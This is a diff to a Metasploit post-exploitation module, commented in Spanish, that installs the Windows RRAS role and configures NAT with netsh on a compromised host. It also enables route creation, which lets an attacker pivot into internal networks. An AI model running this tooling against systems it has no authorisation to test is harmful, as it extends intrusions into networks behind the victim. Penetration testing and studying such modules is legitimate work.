@@ -106,14 +106,15 @@ class MetasploitModule < Msf::Post
 			# ¿Es windows 2008,2012 o 2016?
 				if have_powershell?
 					print_status("Powershell is installed. Trying to install the services.")
-					
 					# Ejecutar en powershell: Import-Module Servermanager ; Add-WindowsFeature NPAS-RRAS-Services
-					print_status(psh_exec("Import-Module Servermanager; Add-WindowsFeature NPAS-RRAS-Services"))
-					
+					# En SSOO de 64 bits hay que ejecutar powershell de 64 bits para que funcione, si la shell/meterpreter es para 32 bits no funciona porque no existe el módulo ServerManager. Habría que comprobarlo en un W2008, W2012 y W2016 de 32 bits.
+					print_status(psh_exec("Get-Module -ListAvailable ; Import-Module ServerManager; Add-WindowsFeature NPAS-RRAS-Services"))
 				else
-					print_bad("Powershell is not installed. The operations can't be done.")
+					print_bad("Powershell is not installed. Trying to install from command line...")
+					print_status(cmd_exec("c:\Windows\system32\ServerManagerCmd.exe -install NPAS-RRAS-Services"))
 					# Exit del modulo
 				end
+			# Si es WinXP o W2003 funciona sin instalar roles, y sería ejecutar desde aquí.
 			print_status(cmd_exec("netsh routing ip nat install"))
 			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
 			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
@@ -243,8 +244,9 @@ class MetasploitModule < Msf::Post
 			# print_status("Computer name: #{'Computer'} ")
 			# print_status("Current user: #{session.sys.config.getuid}")
 			
+			# print_status(psh_exec("Get-Module -ListAvailable"))
 			set_pivot()
-			# create_route()
+			create_route()
 			# para saber si las rutas son correctas
 			# print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
 			# print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
